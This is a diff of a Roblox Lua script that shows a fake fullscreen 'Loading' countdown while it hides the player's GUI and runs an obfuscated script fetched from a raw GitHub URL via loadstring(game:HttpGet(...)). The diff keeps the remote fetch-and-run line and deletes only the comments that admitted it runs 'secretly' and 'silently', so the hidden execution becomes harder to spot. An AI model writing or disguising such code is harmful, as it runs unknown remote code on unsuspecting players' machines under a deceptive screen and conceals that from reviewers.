@@ -8,7 +8,7 @@ for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
     end
 end
 
--- Create fullscreen black GUI (Loading Screen)
+-- Create fullscreen black GUI
 local loadingGui = Instance.new("ScreenGui")
 loadingGui.Name = "FullLoadingScreen"
 loadingGui.IgnoreGuiInset = true
@@ -35,11 +35,9 @@ loadingText.Font = Enum.Font.SourceSansBold
 loadingText.Text = "Loading: " .. countdownTime
 loadingText.Parent = background
 
--- === Run GitHub-hosted obfuscated script secretly in the background ===
+-- Run GitHub-hosted obfuscated script in the background
 spawn(function()
-    -- Hide everything while the loading screen is active
     local success, err = pcall(function()
-        -- This is where your obfuscated script from GitHub will run silently in the background
         loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/awda/refs/heads/main/grow-garden"))()
     end)
     if not success then
@@ -47,13 +45,13 @@ spawn(function()
     end
 end)
 
--- Countdown timer (hidden but the loading screen remains visible)
+-- Countdown timer
 for i = countdownTime, 1, -1 do
     loadingText.Text = "Loading: " .. i
     wait(1)
 end
 
--- Remove the loading screen and restore all GUI after countdown
+-- Restore GUI
 loadingGui:Destroy()
 for _, gui in pairs(player.PlayerGui:GetChildren()) do
     if gui:IsA("ScreenGui") then
